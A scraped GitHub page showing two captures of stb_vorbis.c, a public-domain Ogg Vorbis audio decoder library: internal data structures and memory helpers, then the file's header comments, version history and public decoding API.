#if 0#include <crtdbg.h>#define CHECK(f) \_CrtIsValidHeapPointer(f->channel\_buffers[1])#else#define CHECK(f) ((void) 0)#endif
#define MAX\_BLOCKSIZE\_LOG 13 // from specification#define MAX\_BLOCKSIZE (1 << MAX\_BLOCKSIZE\_LOG)
typedef unsigned char uint8;typedef signed char int8;typedef unsigned short uint16;typedef signed short int16;typedef unsigned int uint32;typedef signed int int32;
#ifndef TRUE#define TRUE 1#define FALSE 0#endif
typedef float codetype;
#ifdef \_MSC\_VER#define STBV\_NOTUSED(v) (void)(v)#else#define STBV\_NOTUSED(v) (void)sizeof(v)#endif
// @NOTE//// Some arrays below are tagged "//varies", which means it's actually// a variable-sized piece of data, but rather than malloc I assume it's// small enough it's better to just allocate it all together with the// main thing//// Most of the variables are specified with the smallest size I could pack// them into. It might give better performance to make them all full-sized// integers. It should be safe to freely rearrange the structures or change// the sizes larger--nothing relies on silently truncating etc., nor the// order of variables.
#define FAST\_HUFFMAN\_TABLE\_SIZE (1 << STB\_VORBIS\_FAST\_HUFFMAN\_LENGTH)#define FAST\_HUFFMAN\_TABLE\_MASK (FAST\_HUFFMAN\_TABLE\_SIZE - 1)
typedef struct{ int dimensions, entries; uint8 \*codeword\_lengths; float minimum\_value; float delta\_value; uint8 value\_bits; uint8 lookup\_type; uint8 sequence\_p; uint8 sparse; uint32 lookup\_values; codetype \*multiplicands; uint32 \*codewords; #ifdef STB\_VORBIS\_FAST\_HUFFMAN\_SHORT int16 fast\_huffman[FAST\_HUFFMAN\_TABLE\_SIZE]; #else int32 fast\_huffman[FAST\_HUFFMAN\_TABLE\_SIZE]; #endif uint32 \*sorted\_codewords; int \*sorted\_values; int sorted\_entries;} Codebook;
typedef struct{ uint8 order; uint16 rate; uint16 bark\_map\_size; uint8 amplitude\_bits; uint8 amplitude\_offset; uint8 number\_of\_books; uint8 book\_list[16]; // varies} Floor0;
typedef struct{ uint8 partitions; uint8 partition\_class\_list[32]; // varies uint8 class\_dimensions[16]; // varies uint8 class\_subclasses[16]; // varies uint8 class\_masterbooks[16]; // varies int16 subclass\_books[16][8]; // varies uint16 Xlist[31\*8+2]; // varies uint8 sorted\_order[31\*8+2]; uint8 neighbors[31\*8+2][2]; uint8 floor1\_multiplier; uint8 rangebits; int values;} Floor1;
typedef union{ Floor0 floor0; Floor1 floor1;} Floor;
typedef struct{ uint32 begin, end; uint32 part\_size; uint8 classifications; uint8 classbook; uint8 \*\*classdata; int16 (\*residue\_books)[8];} Residue;
typedef struct{ uint8 magnitude; uint8 angle; uint8 mux;} MappingChannel;
typedef struct{ uint16 coupling\_steps; MappingChannel \*chan; uint8 submaps; uint8 submap\_floor[15]; // varies uint8 submap\_residue[15]; // varies} Mapping;
typedef struct{ uint8 blockflag; uint8 mapping; uint16 windowtype; uint16 transformtype;} Mode;
typedef struct{ uint32 goal\_crc; // expected crc if match int bytes\_left; // bytes left in packet uint32 crc\_so\_far; // running crc int bytes\_done; // bytes processed in \_current\_ chunk uint32 sample\_loc; // granule pos encoded in page} CRCscan;
typedef struct{ uint32 page\_start, page\_end; uint32 last\_decoded\_sample;} ProbedPage;
struct stb\_vorbis{ // user-accessible info unsigned int sample\_rate; int channels;
 unsigned int setup\_memory\_required; unsigned int temp\_memory\_required; unsigned int setup\_temp\_memory\_required;
 char \*vendor; int comment\_list\_length; char \*\*comment\_list;
 // input config#ifndef STB\_VORBIS\_NO\_STDIO FILE \*f; uint32 f\_start; int close\_on\_free;#endif
 uint8 \*stream; uint8 \*stream\_start; uint8 \*stream\_end;
 uint32 stream\_len;
 uint8 push\_mode;
 // the page to seek to when seeking to start, may be zero uint32 first\_audio\_page\_offset;
 // p\_first is the page on which the first audio packet ends // (but not necessarily the page on which it starts) ProbedPage p\_first, p\_last;
 // memory management stb\_vorbis\_alloc alloc; int setup\_offset; int temp\_offset;
 // run-time results int eof; enum STBVorbisError error;
 // user-useful data
 // header info int blocksize[2]; int blocksize\_0, blocksize\_1; int codebook\_count; Codebook \*codebooks; int floor\_count; uint16 floor\_types[64]; // varies Floor \*floor\_config; int residue\_count; uint16 residue\_types[64]; // varies Residue \*residue\_config; int mapping\_count; Mapping \*mapping; int mode\_count; Mode mode\_config[64]; // varies
 uint32 total\_samples;
 // decode buffer float \*channel\_buffers[STB\_VORBIS\_MAX\_CHANNELS]; float \*outputs [STB\_VORBIS\_MAX\_CHANNELS];
 float \*previous\_window[STB\_VORBIS\_MAX\_CHANNELS]; int previous\_length;
 #ifndef STB\_VORBIS\_NO\_DEFER\_FLOOR int16 \*finalY[STB\_VORBIS\_MAX\_CHANNELS]; #else float \*floor\_buffers[STB\_VORBIS\_MAX\_CHANNELS]; #endif
 uint32 current\_loc; // sample location of next frame to decode int current\_loc\_valid;
 // per-blocksize precomputed data
 // twiddle factors float \*A[2],\*B[2],\*C[2]; float \*window[2]; uint16 \*bit\_reverse[2];
 // current page/packet/segment streaming info uint32 serial; // stream serial number for verification int last\_page; int segment\_count; uint8 segments[255]; uint8 page\_flag; uint8 bytes\_in\_seg; uint8 first\_decode; int next\_seg; int last\_seg; // flag that we're on the last segment int last\_seg\_which; // what was the segment number of the last seg? uint32 acc; int valid\_bits; int packet\_bytes; int end\_seg\_with\_known\_loc; uint32 known\_loc\_for\_packet; int discard\_samples\_deferred; uint32 samples\_output;
 // push mode scanning int page\_crc\_tests; // only in push\_mode: number of tests active; -1 if not searching#ifndef STB\_VORBIS\_NO\_PUSHDATA\_API CRCscan scan[STB\_VORBIS\_PUSHDATA\_CRC\_COUNT];#endif
 // sample-access int channel\_buffer\_start; int channel\_buffer\_end;};
#if defined(STB\_VORBIS\_NO\_PUSHDATA\_API) #define IS\_PUSH\_MODE(f) FALSE#elif defined(STB\_VORBIS\_NO\_PULLDATA\_API) #define IS\_PUSH\_MODE(f) TRUE#else #define IS\_PUSH\_MODE(f) ((f)->push\_mode)#endif
typedef struct stb\_vorbis vorb;
static int error(vorb \*f, enum STBVorbisError e){ f->error = e; if (!f->eof && e != VORBIS\_need\_more\_data) { f->error=e; // breakpoint for debugging } return 0;}
// these functions are used for allocating temporary memory// while decoding. if you can afford the stack space, use// alloca(); otherwise, provide a temp buffer and it will// allocate out of those.
#define array\_size\_required(count,size) (count\*(sizeof(void \*)+(size)))
#define temp\_alloc(f,size) (f->alloc.alloc\_buffer ? setup\_temp\_malloc(f,size) : alloca(size))#define temp\_free(f,p) (void)0#define temp\_alloc\_save(f) ((f)->temp\_offset)#define temp\_alloc\_restore(f,p) ((f)->temp\_offset = (p))
#define temp\_block\_array(f,count,size) make\_block\_array(temp\_alloc(f,array\_size\_required(count,size)), count, size)
// given a sufficiently large block of memory, make an array of pointers to subblocks of itstatic void \*make\_block\_array(void \*mem, int count, int size){ int i; void \*\* p = (void \*\*) mem; char \*q = (char \*) (p + count); for (i=0; i < count; ++i) { p[i] = q; q += size; } return p;}
static void \*setup\_malloc(vorb \*f, int sz){ sz = (sz+7) & ~7; // round up to nearest 8 for alignment of future allocs. f->setup\_memory\_required += sz; if (f->alloc.alloc\_buffer) { void \*p = (char \*) f->alloc.alloc\_buffer + f->setup\_offset; if (f->setup\_offset + sz > f->temp\_offset) return NULL; f->setup\_offset += sz; return p; } return sz ? malloc(sz) : NULL;}
static void setup\_free(vorb \*f, void \*p){ if (f->alloc.alloc\_buffer) return; // do nothing; setup mem is a stack free(p);}
static void \*setup\_temp\_malloc(vorb \*f, int sz){ sz = (sz+7) & ~7; // round up to nearest 8 for alignment of future allocs. if (f->alloc.alloc\_buffer) { if (f->temp\_offset - sz < f->setup\_offset) return NULL; f->temp\_offset -= sz; return (char \*) f->alloc.alloc\_buffer + f->temp\_offset; } return malloc(sz);}
static void setup\_temp\_free(vorb \*f, void \*p, int sz){ if (f->alloc.alloc\_buffer) { f->temp\_offset += (sz+7)&~7; return; } free(p);}
#define CRC32\_POLY 0x04c11db7 // from spec
static uint32 crc\_table[256];static void crc32\_init(void){ int i,j; uint32 s; for(i=0; i < 256; i++) { for (s=(uint32) i << 24, j=0; j < 8; ++j) s = (s << 1) ^ (s >= (1U<<31) ? CRC32\_POLY : 0); crc\_table[i] = s; }[View remainder of file in raw view](https://github.com/nothings/stb/raw/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_df1eea79_20250111_170025.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnothings%2Fstb%2Fblob%2F5736b15f7ea0ffb08dd38af21067c314d6a3aae9%2Fstb_vorbis.c)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnothings%2Fstb%2Fblob%2F5736b15f7ea0ffb08dd38af21067c314d6a3aae9%2Fstb_vorbis.c)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=nothings%2Fstb)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[nothings](/nothings)
/
**[stb](/nothings/stb)**
Public

* [Notifications](/login?return_to=%2Fnothings%2Fstb) You must be signed in to change notification settings
* [Fork
  7.7k](/login?return_to=%2Fnothings%2Fstb)
* [Star
   27.5k](/login?return_to=%2Fnothings%2Fstb)

* [Code](/nothings/stb)
* [Issues
  158](/nothings/stb/issues)
* [Pull requests
  131](/nothings/stb/pulls)
* [Discussions](/nothings/stb/discussions)
* [Actions](/nothings/stb/actions)
* [Projects
  0](/nothings/stb/projects)
* [Security](/nothings/stb/security)
* [Insights](/nothings/stb/pulse)

Additional navigation options

* [Code](/nothings/stb)
* [Issues](/nothings/stb/issues)
* [Pull requests](/nothings/stb/pulls)
* [Discussions](/nothings/stb/discussions)
* [Actions](/nothings/stb/actions)
* [Projects](/nothings/stb/projects)
* [Security](/nothings/stb/security)
* [Insights](/nothings/stb/pulse)

## Files

 5736b15
## Breadcrumbs

1. [stb](/nothings/stb/tree/5736b15f7ea0ffb08dd38af21067c314d6a3aae9)
/
# stb\_vorbis.c

Copy path Blame  Blame
## Latest commit

## History

[History](/nothings/stb/commits/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c)5584 lines (4959 loc) · 188 KB 5736b15
## Breadcrumbs

1. [stb](/nothings/stb/tree/5736b15f7ea0ffb08dd38af21067c314d6a3aae9)
/
# stb\_vorbis.c

Top
## File metadata and controls

* Code
* Blame

5584 lines (4959 loc) · 188 KB[Raw](https://github.com/nothings/stb/raw/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000// Ogg Vorbis audio decoder - v1.22 - public domain// http://nothings.org/stb\_vorbis///// Original version written by Sean Barrett in 2007.//// Originally sponsored by RAD Game Tools. Seeking implementation// sponsored by Phillip Bennefall, Marc Andersen, Aaron Baker,// Elias Software, Aras Pranckevicius, and Sean Barrett.//// LICENSE//// See end of file for license information.//// Limitations://// - floor 0 not supported (used in old ogg vorbis files pre-2004)// - lossless sample-truncation at beginning ignored// - cannot concatenate multiple vorbis streams// - sample positions are 32-bit, limiting seekable 192Khz// files to around 6 hours (Ogg supports 64-bit)//// Feature contributors:// Dougall Johnson (sample-exact seeking)//// Bugfix/warning contributors:// Terje Mathisen Niklas Frykholm Andy Hill// Casey Muratori John Bolton Gargaj// Laurent Gomila Marc LeBlanc Ronny Chevalier// Bernhard Wodo Evan Balster github:alxprd// Tom Beaumont Ingo Leitgeb Nicolas Guillemot// Phillip Bennefall Rohit Thiago Goulart// github:manxorist Saga Musix github:infatum// Timur Gagiev Maxwell Koo Peter Waller// github:audinowho Dougall Johnson David Reid// github:Clownacy Pedro J. Estebanez Remi Verschelde// AnthoFoxo github:morlat Gabriel Ravier//// Partial history:// 1.22 - 2021-07-11 - various small fixes// 1.21 - 2021-07-02 - fix bug for files with no comments// 1.20 - 2020-07-11 - several small fixes// 1.19 - 2020-02-05 - warnings// 1.18 - 2020-02-02 - fix seek bugs; parse header comments; misc warnings etc.// 1.17 - 2019-07-08 - fix CVE-2019-13217..CVE-2019-13223 (by ForAllSecure)// 1.16 - 2019-03-04 - fix warnings// 1.15 - 2019-02-07 - explicit failure if Ogg Skeleton data is found// 1.14 - 2018-02-11 - delete bogus dealloca usage// 1.13 - 2018-01-29 - fix truncation of last frame (hopefully)// 1.12 - 2017-11-21 - limit residue begin/end to blocksize/2 to avoid large temp allocs in bad/corrupt files// 1.11 - 2017-07-23 - fix MinGW compilation// 1.10 - 2017-03-03 - more robust seeking; fix negative ilog(); clear error in open\_memory// 1.09 - 2016-04-04 - back out 'truncation of last frame' fix from previous version// 1.08 - 2016-04-02 - warnings; setup memory leaks; truncation of last frame// 1.07 - 2015-01-16 - fixes for crashes on invalid files; warning fixes; const// 1.06 - 2015-08-31 - full, correct support for seeking API (Dougall Johnson)// some crash fixes when out of memory or with corrupt files// fix some inappropriately signed shifts// 1.05 - 2015-04-19 - don't define \_\_forceinline if it's redundant// 1.04 - 2014-08-27 - fix missing const-correct case in API// 1.03 - 2014-08-07 - warning fixes// 1.02 - 2014-07-09 - declare qsort comparison as explicitly \_cdecl in Windows// 1.01 - 2014-06-18 - fix stb\_vorbis\_get\_samples\_float (interleaved was correct)// 1.0 - 2014-05-26 - fix memory leaks; fix warnings; fix bugs in >2-channel;// (API change) report sample rate for decode-full-file funcs//// See end of file for full version history.
////////////////////////////////////////////////////////////////////////////////// HEADER BEGINS HERE//
#ifndef STB\_VORBIS\_INCLUDE\_STB\_VORBIS\_H#define STB\_VORBIS\_INCLUDE\_STB\_VORBIS\_H
#if defined(STB\_VORBIS\_NO\_CRT) && !defined(STB\_VORBIS\_NO\_STDIO)#define STB\_VORBIS\_NO\_STDIO 1#endif
#ifndef STB\_VORBIS\_NO\_STDIO#include <stdio.h>#endif
#ifdef \_\_cplusplusextern "C" {#endif
/////////// THREAD SAFETY
// Individual stb\_vorbis\* handles are not thread-safe; you cannot decode from// them from multiple threads at the same time. However, you can have multiple// stb\_vorbis\* handles and decode from them independently in multiple thrads.
/////////// MEMORY ALLOCATION
// normally stb\_vorbis uses malloc() to allocate memory at startup,// and alloca() to allocate temporary memory during a frame on the// stack. (Memory consumption will depend on the amount of setup// data in the file and how you set the compile flags for speed// vs. size. In my test files the maximal-size usage is ~150KB.)//// You can modify the wrapper functions in the source (setup\_malloc,// setup\_temp\_malloc, temp\_malloc) to change this behavior, or you// can use a simpler allocation model: you pass in a buffer from// which stb\_vorbis will allocate \_all\_ its memory (including the// temp memory). "open" may fail with a VORBIS\_outofmem if you// do not pass in enough data; there is no way to determine how// much you do need except to succeed (at which point you can// query get\_info to find the exact amount required. yes I know// this is lame).//// If you pass in a non-NULL buffer of the type below, allocation// will occur from it as described above. Otherwise just pass NULL// to use malloc()/alloca()
typedef struct{ char \*alloc\_buffer; int alloc\_buffer\_length\_in\_bytes;} stb\_vorbis\_alloc;
/////////// FUNCTIONS USEABLE WITH ALL INPUT MODES
typedef struct stb\_vorbis stb\_vorbis;
typedef struct{ unsigned int sample\_rate; int channels;
 unsigned int setup\_memory\_required; unsigned int setup\_temp\_memory\_required; unsigned int temp\_memory\_required;
 int max\_frame\_size;} stb\_vorbis\_info;
typedef struct{ char \*vendor;
 int comment\_list\_length; char \*\*comment\_list;} stb\_vorbis\_comment;
// get general information about the fileextern stb\_vorbis\_info stb\_vorbis\_get\_info(stb\_vorbis \*f);
// get ogg commentsextern stb\_vorbis\_comment stb\_vorbis\_get\_comment(stb\_vorbis \*f);
// get the last error detected (clears it, too)extern int stb\_vorbis\_get\_error(stb\_vorbis \*f);
// close an ogg vorbis file and free all memory in useextern void stb\_vorbis\_close(stb\_vorbis \*f);
// this function returns the offset (in samples) from the beginning of the// file that will be returned by the next decode, if it is known, or -1// otherwise. after a flush\_pushdata() call, this may take a while before// it becomes valid again.// NOT WORKING YET after a seek with PULLDATA APIextern int stb\_vorbis\_get\_sample\_offset(stb\_vorbis \*f);
// returns the current seek point within the file, or offset from the beginning// of the memory buffer. In pushdata mode it returns 0.extern unsigned int stb\_vorbis\_get\_file\_offset(stb\_vorbis \*f);
/////////// PUSHDATA API
#ifndef STB\_VORBIS\_NO\_PUSHDATA\_API
// this API allows you to get blocks of data from any source and hand// them to stb\_vorbis. you have to buffer them; stb\_vorbis will tell// you how much it used, and you have to give it the rest next time;// and stb\_vorbis may not have enough data to work with and you will// need to give it the same data again PLUS more. Note that the Vorbis// specification does not bound the size of an individual frame.
extern stb\_vorbis \*stb\_vorbis\_open\_pushdata( const unsigned char \* datablock, int datablock\_length\_in\_bytes, int \*datablock\_memory\_consumed\_in\_bytes, int \*error, const stb\_vorbis\_alloc \*alloc\_buffer);// create a vorbis decoder by passing in the initial data block containing// the ogg&vorbis headers (you don't need to do parse them, just provide// the first N bytes of the file--you're told if it's not enough, see below)// on success, returns an stb\_vorbis \*, does not set error, returns the amount of// data parsed/consumed on this call in \*datablock\_memory\_consumed\_in\_bytes;// on failure, returns NULL on error and sets \*error, does not change \*datablock\_memory\_consumed// if returns NULL and \*error is VORBIS\_need\_more\_data, then the input block was// incomplete and you need to pass in a larger block from the start of the file
extern int stb\_vorbis\_decode\_frame\_pushdata( stb\_vorbis \*f, const unsigned char \*datablock, int datablock\_length\_in\_bytes, int \*channels, // place to write number of float \* buffers float \*\*\*output, // place to write float \*\* array of float \* buffers int \*samples // place to write number of output samples );// decode a frame of audio sample data if possible from the passed-in data block//// return value: number of bytes we used from datablock//// possible cases:// 0 bytes used, 0 samples output (need more data)// N bytes used, 0 samples output (resynching the stream, keep going)// N bytes used, M samples output (one frame of data)// note that after opening a file, you will ALWAYS get one N-bytes,0-sample// frame, because Vorbis always "discards" the first frame.//// Note that on resynch, stb\_vorbis will rarely consume all of the buffer,// instead only datablock\_length\_in\_bytes-3 or less. This is because it wants// to avoid missing parts of a page header if they cross a datablock boundary,// without writing state-machiney code to record a partial detection.//// The number of channels returned are stored in \*channels (which can be// NULL--it is always the same as the number of channels reported by// get\_info). \*output will contain an array of float\* buffers, one per// channel. In other words, (\*output)[0][0] contains the first sample from// the first channel, and (\*output)[1][0] contains the first sample from// the second channel.//// \*output points into stb\_vorbis's internal output buffer storage; these// buffers are owned by stb\_vorbis and application code should not free// them or modify their contents. They are transient and will be overwritten// once you ask for more data to get decoded, so be sure to grab any data// you need before then.
extern void stb\_vorbis\_flush\_pushdata(stb\_vorbis \*f);// inform stb\_vorbis that your next datablock will not be contiguous with// previous ones (e.g. you've seeked in the data); future attempts to decode// frames will cause stb\_vorbis to resynchronize (as noted above), and// once it sees a valid Ogg page (typically 4-8KB, as large as 64KB), it// will begin decoding the \_next\_ frame.//// if you want to seek using pushdata, you need to seek in your file, then// call stb\_vorbis\_flush\_pushdata(), then start calling decoding, then once// decoding is returning you data, call stb\_vorbis\_get\_sample\_offset, and// if you don't like the result, seek your file again and repeat.#endif
////////// PULLING INPUT API
#ifndef STB\_VORBIS\_NO\_PULLDATA\_API// This API assumes stb\_vorbis is allowed to pull data from a source--// either a block of memory containing the \_entire\_ vorbis stream, or a// FILE \* that you or it create, or possibly some other reading mechanism// if you go modify the source to replace the FILE \* case with some kind// of callback to your code. (But if you don't support seeking, you may// just want to go ahead and use pushdata.)
#if !defined(STB\_VORBIS\_NO\_STDIO) && !defined(STB\_VORBIS\_NO\_INTEGER\_CONVERSION)extern int stb\_vorbis\_decode\_filename(const char \*filename, int \*channels, int \*sample\_rate, short \*\*output);#endif#if !defined(STB\_VORBIS\_NO\_INTEGER\_CONVERSION)extern int stb\_vorbis\_decode\_memory(const unsigned char \*mem, int len, int \*channels, int \*sample\_rate, short \*\*output);#endif// decode an entire file and output the data interleaved into a malloc()ed// buffer stored in \*output. The return value is the number of samples// decoded, or -1 if the file could not be opened or was not an ogg vorbis file.// When you're done with it, just free() the pointer returned in \*output.
extern stb\_vorbis \* stb\_vorbis\_open\_memory(const unsigned char \*data, int len, int \*error, const stb\_vorbis\_alloc \*alloc\_buffer);// create an ogg vorbis decoder from an ogg vorbis stream in memory (note// this must be the entire stream!). on failure, returns NULL and sets \*error
#ifndef STB\_VORBIS\_NO\_STDIOextern stb\_vorbis \* stb\_vorbis\_open\_filename(const char \*filename, int \*error, const stb\_vorbis\_alloc \*alloc\_buffer);// create an ogg vorbis decoder from a filename via fopen(). on failure,// returns NULL and sets \*error (possibly to VORBIS\_file\_open\_failure).
extern stb\_vorbis \* stb\_vorbis\_open\_file(FILE \*f, int close\_handle\_on\_close, int \*error, const stb\_vorbis\_alloc \*alloc\_buffer);// create an ogg vorbis decoder from an open FILE \*, looking for a stream at// the \_current\_ seek point (ftell). on failure, returns NULL and sets \*error.// note that stb\_vorbis must "own" this stream; if you seek it in between// calls to stb\_vorbis, it will become confused. Moreover, if you attempt to// perform stb\_vorbis\_seek\_\*() operations on this file, it will assume it// owns the \_entire\_ rest of the file after the start point. Use the next// function, stb\_vorbis\_open\_file\_section(), to limit it.
extern stb\_vorbis \* stb\_vorbis\_open\_file\_section(FILE \*f, int close\_handle\_on\_close, int \*error, const stb\_vorbis\_alloc \*alloc\_buffer, unsigned int len);// create an ogg vorbis decoder from an open FILE \*, looking for a stream at// the \_current\_ seek point (ftell); the stream will be of length 'len' bytes.// on failure, returns NULL and sets \*error. note that stb\_vorbis must "own"// this stream; if you seek it in between calls to stb\_vorbis, it will become// confused.#endif
extern int stb\_vorbis\_seek\_frame(stb\_vorbis \*f, unsigned int sample\_number);extern int stb\_vorbis\_seek(stb\_vorbis \*f, unsigned int sample\_number);// these functions seek in the Vorbis file to (approximately) 'sample\_number'.// after calling seek\_frame(), the next call to get\_frame\_\*() will include// the specified sample. after calling stb\_vorbis\_seek(), the next call to// stb\_vorbis\_get\_samples\_\* will start with the specified sample. If you// do not need to seek to EXACTLY the target sample when using get\_samples\_\*,// you can also use seek\_frame().
extern int stb\_vorbis\_seek\_start(stb\_vorbis \*f);// this function is equivalent to stb\_vorbis\_seek(f,0)
extern unsigned int stb\_vorbis\_stream\_length\_in\_samples(stb\_vorbis \*f);extern float stb\_vorbis\_stream\_length\_in\_seconds(stb\_vorbis \*f);// these functions return the total length of the vorbis stream
extern int stb\_vorbis\_get\_frame\_float(stb\_vorbis \*f, int \*channels, float \*\*\*output);// decode the next frame and return the number of samples. the number of// channels returned are stored in \*channels (which can be NULL--it is always// the same as the number of channels reported by get\_info). \*output will// contain an array of float\* buffers, one per channel. These outputs will// be overwritten on the next call to stb\_vorbis\_get\_frame\_\*.//// You generally should not intermix calls to stb\_vorbis\_get\_frame\_\*()// and stb\_vorbis\_get\_samples\_\*(), since the latter calls the former.
#ifndef STB\_VORBIS\_NO\_INTEGER\_CONVERSIONextern int stb\_vorbis\_get\_frame\_short\_interleaved(stb\_vorbis \*f, int num\_c, short \*buffer, int num\_shorts);extern int stb\_vorbis\_get\_frame\_short (stb\_vorbis \*f, int num\_c, short \*\*buffer, int num\_samples);#endif// decode the next frame and return the number of \*samples\* per channel.// Note that for interleaved data, you pass in the number of shorts (the// size of your array), but the return value is the number of samples per// channel, not the total number of samples.//// The data is coerced to the number of channels you request according to the// channel coercion rules (see below). You must pass in the size of your// buffer(s) so that stb\_vorbis will not overwrite the end of the buffer.// The maximum buffer size needed can be gotten from get\_info(); however,// the Vorbis I specification implies an absolute maximum of 4096 samples// per channel.
// Channel coercion rules:// Let M be the number of channels requested, and N the number of channels present,// and Cn be the nth channel; let stereo L be the sum of all L and center channels,// and stereo R be the sum of all R and center channels (channel assignment from the// vorbis spec).// M N output// 1 k sum(Ck) for all k// 2 \* stereo L, stereo R// k l k > l, the first l channels, then 0s// k l k <= l, the first k channels// Note that this is not \_good\_ surround etc. mixing at all! It's just so// you get something useful.
extern int stb\_vorbis\_get\_samples\_float\_interleaved(stb\_vorbis \*f, int channels, float \*buffer, int num\_floats);extern int stb\_vorbis\_get\_samples\_float(stb\_vorbis \*f, int channels, float \*\*buffer, int num\_samples);// gets num\_samples samples, not necessarily on a frame boundary--this requires// buffering so you have to supply the buffers. DOES NOT APPLY THE COERCION RULES.// Returns the number of samples stored per channel; it may be less than requested// at the end of the file. If there are no more samples in the file, returns 0.
